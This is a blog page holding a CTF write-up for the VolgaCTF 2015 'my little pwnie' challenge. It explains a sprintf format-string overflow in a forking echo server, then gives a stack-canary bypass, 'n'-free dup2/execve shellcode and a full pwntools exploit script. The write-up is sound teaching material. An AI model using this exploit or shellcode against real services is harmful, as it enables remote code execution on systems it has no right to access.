@@ -1,0 +1,765 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>VolgaCTF 2015 Quals – my little pwnie - Hacking Tube 2.0</title>
+<meta name="description" content="Category: PwnPoints: 250  Just another pwn task. Break in!nc pwnie.2015.volgactf.ru 7777my_little_pwnie">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="VolgaCTF 2015 Quals – my little pwnie">
+<meta property="og:url" content="http://0.0.0.0:4000/volgactf-quals-ctf-2015-my-little-pwnie/">
+
+
+  <meta property="og:description" content="Category: PwnPoints: 250  Just another pwn task. Break in!nc pwnie.2015.volgactf.ru 7777my_little_pwnie">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2015-05-22T22:08:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/volgactf-quals-ctf-2015-my-little-pwnie/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="VolgaCTF 2015 Quals – my little pwnie">
+    <meta itemprop="description" content="Category: PwnPoints: 250  Just another pwn task. Break in!nc pwnie.2015.volgactf.ru 7777my_little_pwnie">
+    <meta itemprop="datePublished" content="May 22, 2015">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">VolgaCTF 2015 Quals – my little pwnie
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Pwn
+<strong>Points:</strong> 250</p>
+<blockquote>
+  <p>Just another pwn task. Break in!
+nc pwnie.2015.volgactf.ru 7777
+<a href="http://files.2015.volgactf.ru/my_little_pwnie/my_little_pwnie">my_little_pwnie</a></p>
+</blockquote>
+
+<p>I solve the challenge after the end of the CTF, because I think this is a great challenge for practicing <strong>format string</strong> and <strong>sprintf BOF vulnerability</strong>. Special thanks to <a href="http://blog.l4ys.tw">Lays</a> for putting the exploit on the trello and let me have time to study the challenge.</p>
+
+<!-- more -->
+
+<p>We got a 32 bit ELF, with stack guard enabled, but no NX.<br />
+It’s a simple echo server. Whenever someone connect to it, it fork a process to handle the request. First it ask us to input some string, and then it echo the string back to us.</p>
+
+<p>Launch it with IDA Pro and take a look at it:</p>
+
+<p>```c start_echo
+int __cdecl start_echo(int fd)
+{</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int result; // eax@4
+int v2; // esi@4
+int i; // [sp+18h] [bp-A0h]@1
+int v4; // [sp+1Ch] [bp-9Ch]@1
+int v5; // [sp+20h] [bp-98h]@1
+char v6; // [sp+24h] [bp-94h]@1
+int v7; // [sp+9Ch] [bp-1Ch]@1
+
+v7 = *MK_FP(__GS__, 20);
+send_to_user(fd, "This is a simple echo server. Type exit to quit.\n");
+v4 = "ohcE";
+v5 = " :";
+memset(&amp;v6, 0, 120u);
+
+for ( i = 1; i; i = echoing((char *)&amp;v4, fd) )
+;
+result = 0;
+v2 = *MK_FP(__GS__, 20) ^ v7;
+return result; } ```
+</code></pre></div></div>
+
+<p>So, the <code class="highlighter-rouge">start_echo()</code> will call <code class="highlighter-rouge">echoing(v4, fd)</code> , which v4 is a pointer to char<br />
+Let’s take a look at the <code class="highlighter-rouge">echoing()</code> function:</p>
+
+<p>```c echoing
+int __cdecl echoing(char *a1, int fd)
+{
+    int result; // eax@2
+    int v3; // ecx@10
+    int v4; // [sp+20h] [bp-58h]@3
+    char *i; // [sp+24h] [bp-54h]@3
+    char user_input[64]; // [sp+2Ch] [bp-4Ch]@1
+    int v7; // [sp+6Ch] [bp-Ch]@1</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>v7 = *MK_FP(__GS__, 20);
+send_to_user(fd, "Type string to echo back: ");
+memset(user_input, 0, 64u);
+if ( recv(fd, user_input, 63u, 0) )
+{
+    v4 = strcmp(user_input, "exit\n");
+    for ( i = user_input; &amp;user_input[strlen(user_input)] &gt; i; ++i )
+    {
+        if ( *i == 'n' )
+        {
+            *(_DWORD *)a1 = "ts I";
+            *((_DWORD *)a1 + 1) = " pir";
+            *((_DWORD *)a1 + 2) = "siht";
+            *((_DWORD *)a1 + 3) = "fwa ";
+            *((_DWORD *)a1 + 4) = "s lu";
+            *((_DWORD *)a1 + 5) = "obmy";
+            *((_WORD *)a1 + 12) = "\nl";
+            a1[26] = 0;
+            v4 = 0;
+            goto LABEL_9;
+        }
+    }
+    sprintf(a1 + 6, user_input); LABEL_9:
+    send_to_user(fd, a1);
+    result = v4;
+}
+else
+{
+    fwrite("Failed to read socket\n", 1u, 0x16u, stderr);
+    result = -1;
+}
+v3 = *MK_FP(__GS__, 20) ^ v7;
+return result; } ``` So we found that there's a **format string** vulnerability at the line   `sprintf(a1 + 6, user_input);`   But notice that the program will filter out the character 'n', which means we can't use **%n** to write the memory. 
+</code></pre></div></div>
+
+<p>Fortunately, the vulnerability’s happened in <code class="highlighter-rouge">sprintf</code>, not <code class="highlighter-rouge">printf</code>. 
+<code class="highlighter-rouge">sprintf(a1 + 6, user_input)</code> means the <code class="highlighter-rouge">user_input</code> will be <strong>output</strong> to buffer <code class="highlighter-rouge">a1</code> (the one that <code class="highlighter-rouge">start_echo</code> pass into <code class="highlighter-rouge">echoing</code>).</p>
+
+<p>This behavior can be view as the program <strong>copy</strong> <code class="highlighter-rouge">user_input</code>’s content to <code class="highlighter-rouge">a1</code>. If we input string <code class="highlighter-rouge">"%45c"</code>, the program will output 45 characters to <code class="highlighter-rouge">a1</code>, which is, <strong>copy</strong> 45 characters to <code class="highlighter-rouge">a1</code>.</p>
+
+<p>So if we construct the payload string carefully, we can overwrite the return address in <code class="highlighter-rouge">start_echo()</code>. First we’ll have to leak the stack canary. After checking the memory by using gdb, we can found that the canary is at <code class="highlighter-rouge">%26$p</code>. We also need to leak <code class="highlighter-rouge">start_echo()</code>’s <code class="highlighter-rouge">ebp</code> too, since we need to calculate the address of <code class="highlighter-rouge">a1</code> ( which is on the stack in function <code class="highlighter-rouge">start_echo()</code> ). We found that <code class="highlighter-rouge">ebp</code> is at <code class="highlighter-rouge">%29$p</code>.</p>
+
+<p>So by leaking canary &amp; <code class="highlighter-rouge">start_echo()</code>’s ebp , we can construct our payload now. But there’re some details we need to be aware of:</p>
+<ol>
+  <li><strong><code class="highlighter-rouge">sprintf</code> will stop at null byte</strong>. That is, when <code class="highlighter-rouge">sprintf</code> encounter a null byte, it will write the null byte to the buffer and stop.</li>
+  <li>So, <strong>since the first byte of the canary is always null byte</strong>, we’ll have to modify the canary first, so <code class="highlighter-rouge">sprintf</code> will continue writing bytes to buffer and let us overwrite the return address.</li>
+  <li>After we overwrite the return address, we’ll have to change the canary back to its correct value, by sending another payload string to <code class="highlighter-rouge">sprintf</code>.</li>
+  <li>Don’t forget to write the <code class="highlighter-rouge">fd</code> too, or else it will be overwritten to null byte (thanks to <code class="highlighter-rouge">sprintf</code> apparently )</li>
+</ol>
+
+<p>Here’s the payload string:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">canary</span> <span class="o">|=</span> <span class="mh">0x41</span> <span class="c"># remove the null byte first</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c"># padding to canary</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c"># padding to return address</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c"># return address set to buffer's address (=shellcode)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c"># fd</span>
+<span class="c"># send the first payload</span>
+<span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c"># add the null byte back into the canary</span>
+<span class="c"># send the second payload</span>
+<span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>So now we overwrite the return address of function <code class="highlighter-rouge">start_echo()</code> and let it jump to the buffer <code class="highlighter-rouge">a1</code>, which we can put our shellcode on it. But again, there’re some limitations:</p>
+<ol>
+  <li>It’s a <strong>fork server</strong>, so we can’t simply just execute <code class="highlighter-rouge">execve("/bin/sh")</code>. The problem cause by file descriptor will make us fail to execute our own command after we get the shell.</li>
+  <li>So, we’ll have to construct a shellcode, which execute <code class="highlighter-rouge">dup2(4, 0)</code>, <code class="highlighter-rouge">dup2(4, 1)</code> and <code class="highlighter-rouge">dup2(4, 2)</code> before executing <code class="highlighter-rouge">execve("/bin/sh")</code>.</li>
+  <li>Don’t forget the program will filter out the character ‘n’, so we’ll have to do something with it.</li>
+</ol>
+
+<p>For problem 3, my solution was construct a shellcode without having character ‘n’. Or, you can just overwrite the return address to <code class="highlighter-rouge">user_input</code>, since the program doesn’t modify the input, the original input string will still remain on the buffer.</p>
+
+<p>Anyway, I choose to construct a shellcode without having character ‘n’. Typically, during the shellcode construction for executing <code class="highlighter-rouge">execve("/bin/sh")</code>, we’ll have the following assembly:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push 0x68732f2f     ; hs//
+push 0x6e69622f     ; nib/
+</code></pre></div></div>
+
+<p>Which has ‘n’ in it. However, we can simply use <code class="highlighter-rouge">xor</code> to eliminate the character ‘n’. Since <code class="highlighter-rouge">0x6e69622f = 0x91969dd0 ^ 0xffffffff</code>, we can modify the assembly into:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xor ecx, ecx
+dec ecx ; ecx = 0xffffffff
+xor ecx, 0x91969dd0 ; ecx = 0x6e69622f
+push ecx
+</code></pre></div></div>
+
+<p>So here’s the entire assembly:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BITS 32
+
+global _start
+
+_start:                     ; this is where code starts getting exec'ed
+	xor ebx, ebx
+	xor eax, eax
+	xor ecx, ecx
+	xor edx, edx
+	mov bl, 0x4
+
+d:
+	mov al, 0x3f ; dup2 syscall number
+	int 0x80 ; dup2( ebx(=4), ecx(=0, 1, 2) )
+	inc ecx
+	cmp ecx, 0x3
+	jne d
+	
+	; execve(/bin/sh)
+	xor eax, eax
+	mov al, 0xb
+	xor ecx, ecx
+	push ecx
+	push 0x68732f2f
+	dec ecx ; ecx = 0xffffffff
+	xor ecx, 0x91969dd0 ; 0xfffffff ^ 0x91969dd0 = 0x6e69622f
+	push ecx
+	mov ebx, esp
+	xor ecx, ecx
+	int 0x80
+
+</code></pre></div></div>
+
+<p>Finally, we have the exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c">#HOST="localhost"</span>
+<span class="n">HOST</span><span class="o">=</span><span class="s">"pwnie.2015.volgactf.ru"</span>
+<span class="n">PORT</span><span class="o">=</span><span class="s">"7777"</span>
+
+<span class="c"># dup2(4, 0) + dup2(4, 1) + dup2(4, 2) + execve('/bin/sh'), 46 byte</span>
+<span class="n">shellcode</span> <span class="o">=</span>  <span class="p">[</span><span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">]</span>
+
+<span class="c"># insert 0x90 in the left, make it length = 63</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back:"</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking canary &amp; ebp..."</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">".</span><span class="si">%26</span><span class="s">$p.</span><span class="si">%29</span><span class="s">$p"</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">ebp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x9c</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">8</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"canary: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ebp: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ebp</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"buf: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
+
+<span class="n">canary</span> <span class="o">|=</span> <span class="mh">0x41</span> <span class="c"># remove the null byte first</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c"># padding to canary</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c"># padding to return address</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c"># return address set to buffer's address (=shellcode)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c"># fd</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload..."</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c"># add the null byte back into the canary</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"correcting canary..."</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending shellcode..."</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Great challenge, learn a lot from it!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#assembly" class="page__taxonomy-item" rel="tag">assembly</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#bof" class="page__taxonomy-item" rel="tag">BOF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#format-string" class="page__taxonomy-item" rel="tag">format_string</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#volgactf" class="page__taxonomy-item" rel="tag">VolgaCTF</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2015-05-22T22:08:00+08:00">May 22, 2015</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=VolgaCTF+2015+Quals+--+my+little+pwnie%20http%3A%2F%2F0.0.0.0%3A4000%2Fvolgactf-quals-ctf-2015-my-little-pwnie%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fvolgactf-quals-ctf-2015-my-little-pwnie%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fvolgactf-quals-ctf-2015-my-little-pwnie%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/volgactf-2015-quals-math-problem/" class="pagination--pager" title="VolgaCTF 2015 Quals – math problem
+">Previous</a>
+    
+    
+      <a href="/asis-ctf-2015-quals/" class="pagination--pager" title="ASIS CTF 2015 Quals – grids
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
